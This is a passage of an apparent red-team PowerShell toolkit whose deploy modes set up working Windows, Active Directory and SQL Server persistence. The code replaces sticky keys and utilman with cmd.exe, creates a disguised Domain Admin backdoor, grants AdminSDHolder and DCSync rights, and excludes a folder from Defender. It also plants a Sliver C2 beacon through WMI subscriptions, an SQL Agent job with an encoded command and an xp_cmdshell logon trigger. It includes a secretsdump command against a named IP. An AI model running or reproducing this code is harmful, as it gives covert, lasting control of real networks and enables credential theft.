            foreach ($dir in $state.sop_dirs_acl_locked) {
                try {
                    $acl = Get-Acl $dir
                    $acl.Access | Where-Object { $_.IdentityReference -eq "Everyone" -and $_.AccessControlType -eq "Deny" } |
                        ForEach-Object { $acl.RemoveAccessRule($_) | Out-Null }
                    Set-Acl $dir $acl; Write-Success "ACL deny removed: $dir"
                } catch { Write-Warn "ACL restore failed: $_" }
            }
        }

        Write-Section "B / Restore RDP Port"
        try {
            $rdpPath    = "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
            $restorePort = if ($state -and $state.original_rdp_port) { $state.original_rdp_port } else { 3389 }
            Set-ItemProperty $rdpPath -Name PortNumber -Value $restorePort -Type DWord -Force
            Restart-Service TermService -Force -ErrorAction SilentlyContinue
            Write-Success "RDP port restored to $restorePort"
        } catch { Write-Warn "RDP port restore failed: $_" }
        try { Remove-NetFirewallRule -DisplayName $FwRdpRule -ErrorAction SilentlyContinue } catch {}

        Write-Section "A / Restore SQL Port"
        try {
            $instKey = if ($state -and $state.sql_inst_key) { $state.sql_inst_key } else {
                Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server" -ErrorAction SilentlyContinue |
                    Where-Object { $_.PSChildName -match "^MSSQL\d+" } |
                    Select-Object -First 1 -ExpandProperty PSChildName
            }
            if ($instKey) {
                $tcpPath     = "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$instKey\MSSQLServer\SuperSocketNetLib\Tcp\IPAll"
                $restorePort = if ($state -and $state.original_sql_port) { $state.original_sql_port } else { "1433" }
                Set-ItemProperty $tcpPath -Name TcpPort -Value $restorePort -Force
                Restart-Service MSSQLSERVER -Force -ErrorAction SilentlyContinue
                Write-Success "SQL Server port restored to $restorePort"
            }
        } catch { Write-Warn "SQL port restore failed: $_" }
        try { Remove-NetFirewallRule -DisplayName $FwSqlRule -ErrorAction SilentlyContinue } catch {}

        Remove-Item $StateFile -Force -ErrorAction SilentlyContinue
        Write-Success "DisruptMSSQL cleanup complete (backdoor accounts NOT removed -- clean manually)"
    }
    } # end switch
}

# ==============================================================================
# MODULE: PERSIST AD  (from 03_persist_ad.ps1)
# ==============================================================================
function Invoke-PersistAD {
    param([string]$Mode = "deploy")

    $StateDir     = "C:\Windows\System32\spool\drivers\color"
    $StateFile    = "$StateDir\.rt21-ad-persist.json"
    $BeaconExe    = $script:BeaconExe
    $DropDir      = $script:DropDir
    $WmiNS        = "root\subscription"
    $WmiTimerNS   = "root\cimv2"
    $TimerName    = "DiagPlatSvc_HB20"
    $FilterName   = "DiagPlatSvcFilter"
    $ConsumerName = "DiagPlatSvcConsumer"

    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor DarkRed
    Write-Host "   Nov 21 2026 -- AD Persistence"                          -ForegroundColor Yellow
    Write-Host "   StickyKeys | DA Backdoor | AdminSDHolder | DCSync | C2" -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor DarkRed

    switch ($Mode.ToLower()) {

    "deploy" {
        New-Item -Path $StateDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
        New-Item -Path $DropDir  -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
        $di = Get-Item $DropDir -Force -ErrorAction SilentlyContinue
        if ($di) { $di.Attributes = $di.Attributes -bor [System.IO.FileAttributes]::Hidden }

        $state = @{
            deployed_at           = (Get-Date -Format "o")
            accessibility_backups = @()
            backdoor_domain_user  = $null
            backdoor_domain_pass  = $null
            adminsdholder_ace     = $false
            dcsync_rights         = $false
            wmi_timer_name        = $TimerName
            wmi_filter_name       = $FilterName
            wmi_consumer_name     = $ConsumerName
        }

        # -- Phase A: Sticky Keys + Utilman Backdoor ------------------------------
        Write-Section "A / Sticky Keys + Utilman Backdoor"
        $targets = @(
            "$env:SystemRoot\System32\sethc.exe",
            "$env:SystemRoot\System32\utilman.exe"
        )

        foreach ($tgt in $targets) {
            if (-not (Test-Path $tgt)) { Write-Warn "Not found (skip): $tgt"; continue }
            $bkPath = "$StateDir\.bk_$(Split-Path $tgt -Leaf)"
            try {
                & takeown.exe /F $tgt /A 2>$null | Out-Null
                & icacls.exe  $tgt /grant "BUILTIN\Administrators:(F)" /C /Q 2>$null | Out-Null
                Copy-Item $tgt $bkPath -Force -ErrorAction Stop
                Copy-Item "$env:SystemRoot\System32\cmd.exe" $tgt -Force -ErrorAction Stop
                $state["accessibility_backups"] += @{ Original = $tgt; Backup = $bkPath }
                Write-Success "$(Split-Path $tgt -Leaf) -> cmd.exe  (backup: $bkPath)"
            } catch { Write-Warn "Binary swap failed for $tgt : $_" }
        }

        foreach ($bin in @("sethc.exe", "utilman.exe")) {
            $ifeoKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$bin"
            try {
                if (-not (Test-Path $ifeoKey)) { New-Item $ifeoKey -Force | Out-Null }
                Set-ItemProperty $ifeoKey -Name "Debugger" -Value "C:\Windows\System32\cmd.exe" -Force
                Write-Success "IFEO Debugger set: $bin -> cmd.exe"
            } catch { Write-Warn "IFEO failed for $bin : $_" }
        }

        # -- Phase B: Hidden Domain Admin Backdoor --------------------------------
        Write-Section "B / Hidden Domain Admin Backdoor"
        $adAvailable = $false
        try { Import-Module ActiveDirectory -ErrorAction Stop; $adAvailable = $true
        } catch { Write-Err "ActiveDirectory module unavailable -- Phases B/C/D skipped: $_" }

        if ($adAvailable) {
            $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
            $buf = New-Object byte[] 3
            $rng.GetBytes($buf)
            $hexSuffix = ($buf | ForEach-Object { $_.ToString('x2') }) -join ''
            $bdUser    = "svc_spooler$hexSuffix"

            $pwChars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789!@#$%^&*()"
            $pwBuf   = New-Object byte[] 20
            $rng.GetBytes($pwBuf)
            $bdPass = -join ($pwBuf | ForEach-Object { $pwChars[$_ % $pwChars.Length] })

            $state["backdoor_domain_user"] = $bdUser
            $state["backdoor_domain_pass"] = $bdPass

            try {
                $secPw = ConvertTo-SecureString $bdPass -AsPlainText -Force
                New-ADUser -SamAccountName $bdUser -Name $bdUser `
                           -Description "Print Spooler service account (do not disable)" `
                           -AccountPassword $secPw -Enabled $true `
                           -PasswordNeverExpires $true -CannotChangePassword $true -ErrorAction Stop
                Add-ADGroupMember -Identity "Domain Admins" -Members $bdUser -ErrorAction Stop
                Write-Success "Domain backdoor created: $bdUser  pw: $bdPass"
                Write-Success "Added to Domain Admins"
                $script:KeyInfo["persist"] = "DA backdoor: $bdUser  pw: $bdPass | DCSync: impacket-secretsdump UNDERPRESSURE/$bdUser`:'$bdPass'@172.20.240.100"
            } catch { Write-Warn "Domain user/group add failed: $_" }

            # -- Phase C: AdminSDHolder ACE Injection -----------------------------
            Write-Section "C / AdminSDHolder ACE Injection"
            try {
                $domainObj  = Get-ADDomain -ErrorAction Stop
                $domainDN   = $domainObj.DistinguishedName
                $sdHolderDN = "CN=AdminSDHolder,CN=System,$domainDN"
                $bdUserObj  = Get-ADUser $bdUser -ErrorAction Stop
                $userSID    = New-Object System.Security.Principal.SecurityIdentifier($bdUserObj.SID)
                $sdAcl      = Get-Acl "AD:$sdHolderDN" -ErrorAction Stop
                $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                    $userSID,
                    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
                    [System.Security.AccessControl.AccessControlType]::Allow,
                    [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
                )
                $sdAcl.AddAccessRule($ace)
                Set-Acl "AD:$sdHolderDN" $sdAcl -ErrorAction Stop
                Write-Success "AdminSDHolder ACE: $bdUser granted GenericAll"
                $state["adminsdholder_ace"] = $true
            } catch { Write-Warn "AdminSDHolder ACE injection failed: $_" }

            # -- Phase D: DCSync Rights -------------------------------------------
            Write-Section "D / DCSync Rights"
            try {
                $domainDN  = (Get-ADDomain -ErrorAction Stop).DistinguishedName
                $bdUserObj = Get-ADUser $bdUser -ErrorAction Stop
                $userSID   = New-Object System.Security.Principal.SecurityIdentifier($bdUserObj.SID)
                $domainAcl = Get-Acl "AD:$domainDN" -ErrorAction Stop
                $replChanges    = [Guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
                $replChangesAll = [Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
                foreach ($rightGuid in @($replChanges, $replChangesAll)) {
                    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                        $userSID,
                        [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
                        [System.Security.AccessControl.AccessControlType]::Allow,
                        $rightGuid,
                        [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None,
                        [Guid]::Empty
                    )
                    $domainAcl.AddAccessRule($ace)
                }
                Set-Acl "AD:$domainDN" $domainAcl -ErrorAction Stop
                Write-Success "DCSync rights granted to $bdUser"
                $state["dcsync_rights"] = $true
            } catch { Write-Warn "DCSync rights grant failed: $_" }
        }

        # -- Phase E: Sliver C2 Beacon via WMI ------------------------------------
        Write-Section "E / Sliver C2 Beacon"
        try {
            Add-MpPreference -ExclusionPath $DropDir -ErrorAction SilentlyContinue
            if ($script:BeaconSourcePath) {
                Copy-Item $script:BeaconSourcePath $BeaconExe -Force -ErrorAction Stop
                $bf = Get-Item $BeaconExe -Force
                $bf.Attributes = $bf.Attributes -bor [System.IO.FileAttributes]::Hidden
                Write-Success "Beacon copied: $BeaconExe ($((Get-Item $BeaconExe).Length) bytes)"
            } else {
                Write-Warn "No beacon source -- drop $BeaconExe manually; WMI subscription still being planted"
            }
        } catch { Write-Warn "Beacon copy failed: $_" }

        try {
            Get-WmiObject -Namespace $WmiNS -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
                Where-Object { $_.Filter -like "*$FilterName*" } | Remove-WmiObject -ErrorAction SilentlyContinue
            Get-WmiObject -Namespace $WmiNS -Class __EventFilter -ErrorAction SilentlyContinue |
                Where-Object { $_.Name -eq $FilterName } | Remove-WmiObject -ErrorAction SilentlyContinue
            Get-WmiObject -Namespace $WmiNS -Class ActiveScriptEventConsumer -ErrorAction SilentlyContinue |
                Where-Object { $_.Name -eq $ConsumerName } | Remove-WmiObject -ErrorAction SilentlyContinue
            Get-WmiObject -Namespace $WmiTimerNS -Class __IntervalTimerInstruction -ErrorAction SilentlyContinue |
                Where-Object { $_.TimerId -eq $TimerName } | Remove-WmiObject -ErrorAction SilentlyContinue

            Set-WmiInstance -Namespace $WmiTimerNS -Class __IntervalTimerInstruction -Arguments @{
                TimerId               = $TimerName
                IntervalBetweenEvents = [UInt32]1200000
            } -ErrorAction SilentlyContinue | Out-Null

            $wmiFilter = Set-WmiInstance -Namespace $WmiNS -Class __EventFilter -Arguments @{
                Name           = $FilterName
                EventNameSpace = $WmiTimerNS
                QueryLanguage  = "WQL"
                Query          = "SELECT * FROM __TimerEvent WHERE TimerID = '$TimerName'"
            } -ErrorAction Stop

            $vbsLaunch = "Set oShell = CreateObject(""WScript.Shell"")`r`nIf CreateObject(""Scripting.FileSystemObject"").FileExists(""$BeaconExe"") Then`r`n    oShell.Run Chr(34) & ""$BeaconExe"" & Chr(34), 0, False`r`nEnd If"
            $wmiConsumer = Set-WmiInstance -Namespace $WmiNS -Class ActiveScriptEventConsumer -Arguments @{
                Name            = $ConsumerName
                ScriptingEngine = "VBScript"
                ScriptText      = $vbsLaunch
                KillTimeout     = [UInt32]0
            } -ErrorAction Stop

            Set-WmiInstance -Namespace $WmiNS -Class __FilterToConsumerBinding -Arguments @{
                Filter   = $wmiFilter
                Consumer = $wmiConsumer
            } -ErrorAction Stop | Out-Null
            Write-Success "WMI subscription planted -- beacon fires every 20 min"
        } catch { Write-Warn "WMI subscription failed: $_" }

        try {
            $state | ConvertTo-Json -Depth 5 | Set-Content -Path $StateFile -Encoding UTF8 -Force
            $sf = Get-Item $StateFile -Force -ErrorAction SilentlyContinue
            if ($sf) { $sf.Attributes = $sf.Attributes -bor [System.IO.FileAttributes]::Hidden }
            Write-Success "State saved: $StateFile"
        } catch { Write-Warn "State save failed: $_" }
    }

    "cleanup" {
        $state = $null
        if (Test-Path $StateFile) {
            try { $state = Get-Content $StateFile -Raw -Encoding UTF8 | ConvertFrom-Json
            } catch { Write-Warn "State parse failed -- blind cleanup" }
        } else { Write-Warn "No state file -- blind cleanup" }

        Write-Section "A / Restore sethc + utilman + IFEO"
        if ($state -and $state.accessibility_backups) {
            foreach ($entry in $state.accessibility_backups) {
                try {
                    & takeown.exe /F $entry.Original /A 2>$null | Out-Null
                    & icacls.exe  $entry.Original /grant "BUILTIN\Administrators:(F)" /C /Q 2>$null | Out-Null
                    Copy-Item $entry.Backup $entry.Original -Force -ErrorAction Stop
                    Remove-Item $entry.Backup -Force -ErrorAction SilentlyContinue
                    Write-Success "Restored: $($entry.Original)"
                } catch { Write-Warn "Restore failed: $_" }
            }
        }
        foreach ($bin in @("sethc.exe", "utilman.exe")) {
            $ifeoKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$bin"
            Remove-ItemProperty $ifeoKey -Name "Debugger" -Force -ErrorAction SilentlyContinue
        }

        Write-Section "C / Remove AdminSDHolder ACE"
        if ($state -and $state.backdoor_domain_user -and $state.adminsdholder_ace) {
            try {
                Import-Module ActiveDirectory -ErrorAction SilentlyContinue
                $domainDN   = (Get-ADDomain -ErrorAction Stop).DistinguishedName
                $sdHolderDN = "CN=AdminSDHolder,CN=System,$domainDN"
                $bdUserObj  = Get-ADUser $state.backdoor_domain_user -ErrorAction Stop
                $userSID    = New-Object System.Security.Principal.SecurityIdentifier($bdUserObj.SID)
                $sdAcl      = Get-Acl "AD:$sdHolderDN" -ErrorAction Stop
                $sdAcl.Access |
                    Where-Object { try { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) -eq $userSID } catch { $false } } |
                    ForEach-Object { $sdAcl.RemoveAccessRule($_) | Out-Null }
                Set-Acl "AD:$sdHolderDN" $sdAcl -ErrorAction Stop
                Write-Success "AdminSDHolder ACE removed"
            } catch { Write-Warn "AdminSDHolder cleanup failed: $_" }
        }

        Write-Section "D / Remove DCSync Rights"
        if ($state -and $state.backdoor_domain_user -and $state.dcsync_rights) {
            try {
                Import-Module ActiveDirectory -ErrorAction SilentlyContinue
                $domainDN  = (Get-ADDomain -ErrorAction Stop).DistinguishedName
                $bdUserObj = Get-ADUser $state.backdoor_domain_user -ErrorAction Stop
                $userSID   = New-Object System.Security.Principal.SecurityIdentifier($bdUserObj.SID)
                $replChanges    = [Guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
                $replChangesAll = [Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
                $domainAcl = Get-Acl "AD:$domainDN" -ErrorAction Stop
                $domainAcl.Access |
                    Where-Object { try { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) -eq $userSID -and ($_.ObjectType -eq $replChanges -or $_.ObjectType -eq $replChangesAll) } catch { $false } } |
                    ForEach-Object { $domainAcl.RemoveAccessRule($_) | Out-Null }
                Set-Acl "AD:$domainDN" $domainAcl -ErrorAction Stop
                Write-Success "DCSync ACEs removed"
            } catch { Write-Warn "DCSync cleanup failed: $_" }
        }

        Write-Section "B / Remove Domain Backdoor"
        if ($state -and $state.backdoor_domain_user) {
            try {
                Import-Module ActiveDirectory -ErrorAction SilentlyContinue
                Remove-ADUser $state.backdoor_domain_user -Confirm:$false -ErrorAction Stop
                Write-Success "Removed domain user: $($state.backdoor_domain_user)"
            } catch { Write-Warn "AD user removal failed: $_" }
        }

        Write-Section "E / Remove WMI Subscription + Beacon"
        Get-WmiObject -Namespace $WmiNS -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -like "*$FilterName*" } | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace $WmiNS -Class __EventFilter -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq $FilterName } | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace $WmiNS -Class ActiveScriptEventConsumer -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq $ConsumerName } | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace $WmiTimerNS -Class __IntervalTimerInstruction -ErrorAction SilentlyContinue |
            Where-Object { $_.TimerId -eq $TimerName } | Remove-WmiObject -ErrorAction SilentlyContinue
        if (Test-Path $BeaconExe) { Remove-Item $BeaconExe -Force -ErrorAction SilentlyContinue }
        Write-Success "WMI subscription + beacon removed"

        Remove-Item $StateFile -Force -ErrorAction SilentlyContinue
        Write-Success "PersistAD cleanup complete"
    }
    } # end switch
}

# ==============================================================================
# MODULE: PERSIST MSSQL  (from 04_persist_mssql.ps1)
# ==============================================================================
function Invoke-PersistMSSQL {
    param([string]$Mode = "deploy")

    $StateDir     = "C:\Windows\System32\spool\drivers\color"
    $StateFile    = "$StateDir\.rt21-mssql-persist.json"
    $BeaconExe    = $script:BeaconExe
    $DropDir      = $script:DropDir
    $WmiNS        = "root\subscription"
    $TimerName    = "StorPerfWatchdog"
    $FilterName   = "StorPerfWatchdogFilter"
    $ConsumerName = "StorPerfWatchdogConsumer"
    $SqlLoginName = "rt_sqladm"

    Write-Host ""
    Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor DarkRed
    Write-Host "   Nov 21 2026 -- MSSQL Full Engagement Persistence"     -ForegroundColor Yellow
    Write-Host "   StickyKeys | SQL backdoor | Agent job | WMI beacon"   -ForegroundColor Yellow
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor DarkRed

    switch ($Mode.ToLower()) {

    "deploy" {
        New-Item -Path $StateDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
        New-Item -Path $DropDir  -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
        $state = @{ deployed_at = (Get-Date -Format "o") }

        # -- Phase A: Sticky Keys + Utilman Backdoor ------------------------------
        Write-Section "A / Sticky Keys + Utilman Backdoor"
        $targets = @(
            "$env:SystemRoot\System32\sethc.exe",
            "$env:SystemRoot\System32\utilman.exe"
        )
        $state["stickykeys_backups"] = @()
        foreach ($bin in $targets) {
            $bkName = [System.IO.Path]::GetFileNameWithoutExtension($bin) + "_orig.bak"
            $bkPath = "$StateDir\$bkName"
            try {
                & takeown.exe /F $bin /A 2>&1 | Out-Null
                & icacls.exe $bin /grant "Administrators:F" 2>&1 | Out-Null
                Copy-Item $bin $bkPath -Force -ErrorAction Stop
                Copy-Item "$env:SystemRoot\System32\cmd.exe" $bin -Force -ErrorAction Stop
                Write-Success "$([System.IO.Path]::GetFileName($bin)) -> cmd.exe  (backup: $bkPath)"
                $state["stickykeys_backups"] += @{ Original = $bin; Backup = $bkPath }
            } catch { Write-Warn "Binary swap failed for $bin : $_" }

            $ifeoBin = [System.IO.Path]::GetFileName($bin)
            $ifeoKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$ifeoBin"
            try {
                New-Item $ifeoKey -Force | Out-Null
                Set-ItemProperty $ifeoKey -Name Debugger -Value "C:\Windows\System32\cmd.exe" -Force
                Write-Success "IFEO Debugger: $ifeoBin -> cmd.exe"
            } catch { Write-Warn "IFEO key failed for $ifeoBin : $_" }
        }

        # -- Phase B: SQL Login Backdoor ------------------------------------------
        Write-Section "B / SQL Login Backdoor"
        $sqlInstKey = $null
        try {
            $sqlInstKey = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server" -ErrorAction SilentlyContinue |
                Where-Object { $_.PSChildName -match "^MSSQL\d+" } |
                Select-Object -First 1 -ExpandProperty PSChildName
        } catch {}

        if ($sqlInstKey) {
            $authPath = "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$sqlInstKey\MSSQLServer"
            try {
                $origMode = (Get-ItemProperty $authPath -Name LoginMode -ErrorAction SilentlyContinue).LoginMode
                $state["original_login_mode"] = $origMode
                $state["sql_inst_key"] = $sqlInstKey
                Set-ItemProperty $authPath -Name LoginMode -Value 2 -Force
                Write-Success "SQL mixed-mode auth enabled (LoginMode=2, was $origMode)"
            } catch { Write-Warn "LoginMode registry change failed: $_" }

            try {
                Restart-Service MSSQLSERVER -Force -ErrorAction Stop
                Write-Info "Waiting for SQL Server..."
                $waited = 0; $ready = $false
                do {
                    Start-Sleep -Seconds 3; $waited += 3
                    $probe = & sqlcmd.exe -S "(local)" -E -Q "SELECT 1" 2>&1
                    if ($probe -match "^\s*1\s*$") { $ready = $true }
                } while (-not $ready -and $waited -lt 90)
                if ($ready) { Write-Success "SQL Server ready after ${waited}s" }
                else        { Write-Warn "SQL Server did not respond within 90s" }
            } catch { Write-Warn "MSSQLSERVER restart failed: $_" }

            $pwChars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789!@#$%^&*()"
            $rng     = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
            $pwBuf   = New-Object byte[] 16
            $rng.GetBytes($pwBuf)
            $sqlPw = -join ($pwBuf | ForEach-Object { $pwChars[$_ % $pwChars.Length] })
            $state["sql_login"]    = $SqlLoginName
            $state["sql_password"] = $sqlPw

            try {
                & sqlcmd.exe -S "(local)" -E -Q "IF NOT EXISTS (SELECT name FROM sys.server_principals WHERE name = '$SqlLoginName') BEGIN CREATE LOGIN [$SqlLoginName] WITH PASSWORD = N'$sqlPw', CHECK_POLICY = OFF, CHECK_EXPIRATION = OFF; ALTER SERVER ROLE sysadmin ADD MEMBER [$SqlLoginName]; END" 2>&1 | Out-Null
                Write-Success "SQL login created: $SqlLoginName  pw: $sqlPw"
                $script:KeyInfo["persist"] = "SQL login: $SqlLoginName  pw: $sqlPw"
            } catch { Write-Warn "SQLCMD login creation failed: $_" }
        } else { Write-Warn "SQL instance key not found -- skipping SQL login phases" }

        # -- Phase C: SQL Agent Job -----------------------------------------------
        Write-Section "C / SQL Agent Job Beacon Launcher"
        $agentSql = @"
USE msdb;
IF NOT EXISTS (SELECT job_id FROM msdb.dbo.sysjobs WHERE name = 'SystemHealthMonitor')
BEGIN
    EXEC sp_add_job @job_name = 'SystemHealthMonitor', @enabled = 1,
                    @description = 'Monitors system health metrics for performance baseline';
    EXEC sp_add_jobstep @job_name = 'SystemHealthMonitor', @step_name = 'CollectMetrics',
                        @subsystem = 'CMDEXEC',
                        @command = 'powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand JABiAD0AIgBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABXAEUAUgBcAFIAZQBwAG8AcgB0AFF1AGUAdQBlAFwAYwBhAGMAaABlAFwAVwBlAHIARgBhAHUAbAB0AEgAYQBuAGQAbABlAHIALgBlAHgAZQAiADsAaQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAYgApACAA',
                        @on_success_action = 3, @on_fail_action = 3;
    EXEC sp_add_schedule @schedule_name = 'SystemHealthMonitorSchedule',
                         @freq_type = 4, @freq_interval = 1, @freq_subday_type = 4,
                         @freq_subday_interval = 20, @active_start_time = 000000;
    EXEC sp_attach_schedule @job_name = 'SystemHealthMonitor', @schedule_name = 'SystemHealthMonitorSchedule';
    EXEC sp_add_jobserver @job_name = 'SystemHealthMonitor', @server_name = @@SERVERNAME;
END
"@
        try {
            & sqlcmd.exe -S "(local)" -E -Q $agentSql 2>&1 | Out-Null
            Write-Success "SQL Agent job 'SystemHealthMonitor' created (20-min schedule)"
        } catch { Write-Warn "SQL Agent job creation failed: $_" }
        try {
            Set-Service SQLSERVERAGENT -StartupType Automatic -ErrorAction SilentlyContinue
            Start-Service SQLSERVERAGENT -ErrorAction SilentlyContinue
            Write-Success "SQL Server Agent service started"
        } catch {}

        # -- Phase D: xp_cmdshell + DDL Trigger -----------------------------------
        Write-Section "D / xp_cmdshell + DDL Trigger Backdoor"
        $triggerCmd   = "if (Test-Path '$BeaconExe') { Start-Process -FilePath '$BeaconExe' -WindowStyle Hidden }"
        $triggerBytes = [System.Text.Encoding]::Unicode.GetBytes($triggerCmd)
        $triggerB64   = [Convert]::ToBase64String($triggerBytes)

        $xpSql = @"
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'rt_logon_watchdog')
    DROP TRIGGER rt_logon_watchdog ON ALL SERVER;
CREATE TRIGGER rt_logon_watchdog ON ALL SERVER FOR LOGON AS
BEGIN
    BEGIN TRY
        DECLARE @cmd NVARCHAR(500) = N'powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $triggerB64';
        EXEC master..xp_cmdshell @cmd, NO_OUTPUT;
    END TRY BEGIN CATCH END CATCH
END;
"@
        try {
            & sqlcmd.exe -S "(local)" -E -Q $xpSql 2>&1 | Out-Null
            Write-Success "xp_cmdshell enabled, LOGON trigger 'rt_logon_watchdog' created"
        } catch { Write-Warn "xp_cmdshell/trigger setup failed: $_" }

        # -- Phase E: Sliver Beacon via WMI Subscription --------------------------
        Write-Section "E / Sliver C2 Beacon + WMI Subscription"
        try {
            if ($script:BeaconSourcePath) {
                Copy-Item $script:BeaconSourcePath $BeaconExe -Force -ErrorAction Stop
                $fi = Get-Item $BeaconExe -Force
                $fi.Attributes = [System.IO.FileAttributes]"Hidden,System"
                Write-Success "Beacon copied: $BeaconExe"
            } else {
                Write-Warn "No beacon source -- WMI sub will still be planted"
            }
        } catch { Write-Warn "Beacon copy failed: $_" }

        $vbs = "Set oShell = CreateObject(""WScript.Shell"")`r`nsBeacon = ""$BeaconExe""`r`nIf (CreateObject(""Scripting.FileSystemObject"")).FileExists(sBeacon) Then`r`n    oShell.Run Chr(34) & sBeacon & Chr(34), 0, False`r`nEnd If"

        try {
            $existTimer = Get-WmiObject -Namespace "root\cimv2" -Class "__IntervalTimerInstruction" `
                -Filter "TimerId='$TimerName'" -ErrorAction SilentlyContinue
            if ($existTimer) { $existTimer | Remove-WmiObject -ErrorAction SilentlyContinue }
            $timer = Set-WmiInstance -Namespace "root\cimv2" -Class "__IntervalTimerInstruction" -Arguments @{
                TimerId              = $TimerName
                IntervalBetweenEvents = ([UInt32]1200000)
                SkipIfPassed         = $false
            } -ErrorAction Stop
            Write-Success "WMI timer: $TimerName (20 min)"

            $existFilter = Get-WmiObject -Namespace $WmiNS -Class "__EventFilter" `
                -Filter "Name='$FilterName'" -ErrorAction SilentlyContinue
            if ($existFilter) { $existFilter | Remove-WmiObject -ErrorAction SilentlyContinue }
            $filter = Set-WmiInstance -Namespace $WmiNS -Class "__EventFilter" -Arguments @{
                Name           = $FilterName
                EventNameSpace = "root\cimv2"
                QueryLanguage  = "WQL"
                Query          = "SELECT * FROM __TimerEvent WHERE TimerId='$TimerName'"
            } -ErrorAction Stop
            Write-Success "WMI filter: $FilterName"

            $existCons = Get-WmiObject -Namespace $WmiNS -Class "ActiveScriptEventConsumer" `
                -Filter "Name='$ConsumerName'" -ErrorAction SilentlyContinue
            if ($existCons) { $existCons | Remove-WmiObject -ErrorAction SilentlyContinue }
            $consumer = Set-WmiInstance -Namespace $WmiNS -Class "ActiveScriptEventConsumer" -Arguments @{
                Name              = $ConsumerName
                ScriptingEngine   = "VBScript"
                ScriptText        = $vbs
                KillTimeout       = ([UInt32]30)
            } -ErrorAction Stop
            Write-Success "WMI consumer: $ConsumerName"

            $existBind = Get-WmiObject -Namespace $WmiNS -Class "__FilterToConsumerBinding" -ErrorAction SilentlyContinue |
                Where-Object { $_.Filter -like "*$FilterName*" }
            if ($existBind) { $existBind | Remove-WmiObject -ErrorAction SilentlyContinue }
            Set-WmiInstance -Namespace $WmiNS -Class "__FilterToConsumerBinding" -Arguments @{
                Filter   = $filter.__PATH
                Consumer = $consumer.__PATH
            } -ErrorAction Stop | Out-Null
            Write-Success "WMI binding created"
        } catch { Write-Err "WMI subscription failed: $_" }

        try {
            $state | ConvertTo-Json -Depth 5 | Set-Content -Path $StateFile -Encoding UTF8
            Write-Success "State saved: $StateFile"
        } catch { Write-Warn "State save failed: $_" }
    }

    "cleanup" {
        $state = $null
        if (Test-Path $StateFile) {
            try { $state = Get-Content $StateFile -Raw -Encoding UTF8 | ConvertFrom-Json
            } catch { Write-Warn "State parse failed -- blind cleanup" }
        } else { Write-Warn "No state file -- blind cleanup" }

        Write-Section "E / Remove WMI Subscription"
        try {
            Get-WmiObject -Namespace $WmiNS -Class "__FilterToConsumerBinding" -ErrorAction SilentlyContinue |
                Where-Object { $_.Filter -like "*$FilterName*" } | Remove-WmiObject -ErrorAction SilentlyContinue
            Get-WmiObject -Namespace $WmiNS -Class "ActiveScriptEventConsumer" `
                -Filter "Name='$ConsumerName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
            Get-WmiObject -Namespace $WmiNS -Class "__EventFilter" `
                -Filter "Name='$FilterName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
            Get-WmiObject -Namespace "root\cimv2" -Class "__IntervalTimerInstruction" `
                -Filter "TimerId='$TimerName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
            Write-Success "WMI subscription removed"
        } catch { Write-Warn "WMI removal failed: $_" }
        Remove-Item $BeaconExe -Force -ErrorAction SilentlyContinue

